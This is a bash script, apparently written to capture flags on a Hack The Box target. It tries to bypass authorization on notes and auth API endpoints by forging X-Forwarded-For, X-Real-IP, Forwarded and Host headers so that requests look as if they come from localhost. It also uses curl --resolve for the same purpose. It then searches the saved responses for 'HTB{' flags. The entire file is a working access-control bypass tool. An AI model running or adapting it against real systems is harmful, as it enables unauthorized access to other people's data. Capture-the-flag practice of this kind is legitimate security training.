#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
PORT=${2:?PORT}
TOKEN_FILE=${3:?TOKEN_FILE}
TO=${4:-8}
OUT_DIR=${5:-/workspace/recon/httpx}
mkdir -p "$OUT_DIR/bypass_${IP}_${PORT}"
BASE="http://$IP:$PORT"
TOKEN=$(cat "$TOKEN_FILE")
# Paths to try
paths=(/api/notes/all /api/notes?all=1 /api/auth/verify)
# Header variants
headers=(
  ""
  "-H X-Forwarded-For:127.0.0.1"
  "-H X-Real-IP:127.0.0.1"
  "-H Host:localhost"
  "-H Host:127.0.0.1"
  "-H Forwarded:for=127.0.0.1;host=localhost;proto=http"
)
# 1) Plain host + headers
for p in "${paths[@]}"; do
  name="plain_$(echo "$p"|tr -cd 'A-Za-z0-9')"
  curl -fsS -m "$TO" --connect-timeout "$TO" --path-as-is -i -H "Authorization: Bearer $TOKEN" "$BASE$p" \
    > "$OUT_DIR/bypass_${IP}_${PORT}/${name}.head" 2>/dev/null || true
  for h in "${headers[@]}"; do
    [ -z "$h" ] && continue
    name="plainH_$(echo "$p"|tr -cd 'A-Za-z0-9')_$(echo "$h"|tr -cd 'A-Za-z0-9')"
    curl -fsS -m "$TO" --connect-timeout "$TO" --path-as-is -i -H "Authorization: Bearer $TOKEN" $h "$BASE$p" \
      > "$OUT_DIR/bypass_${IP}_${PORT}/${name}.head" 2>/dev/null || true
  done
done
# 2) --resolve localhost to IP and request via localhost authority
for p in "${paths[@]}"; do
  name="resLocal_$(echo "$p"|tr -cd 'A-Za-z0-9')"
  curl -fsS -m "$TO" --connect-timeout "$TO" --resolve "localhost:$PORT:$IP" --path-as-is -i -H "Authorization: Bearer $TOKEN" \
    "http://localhost:$PORT$p" > "$OUT_DIR/bypass_${IP}_${PORT}/${name}.head" 2>/dev/null || true
  for h in "${headers[@]}"; do
    [ -z "$h" ] && continue
    name="resLocalH_$(echo "$p"|tr -cd 'A-Za-z0-9')_$(echo "$h"|tr -cd 'A-Za-z0-9')"
    curl -fsS -m "$TO" --connect-timeout "$TO" --resolve "localhost:$PORT:$IP" --path-as-is -i -H "Authorization: Bearer $TOKEN" $h \
      "http://localhost:$PORT$p" > "$OUT_DIR/bypass_${IP}_${PORT}/${name}.head" 2>/dev/null || true
  done
done
# 3) Grep for HTB matches
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR/bypass_${IP}_${PORT}" > "$OUT_DIR/bypass_${IP}_${PORT}/hits.txt" || true
sed -n '1,120p' "$OUT_DIR/bypass_${IP}_${PORT}/hits.txt" || true
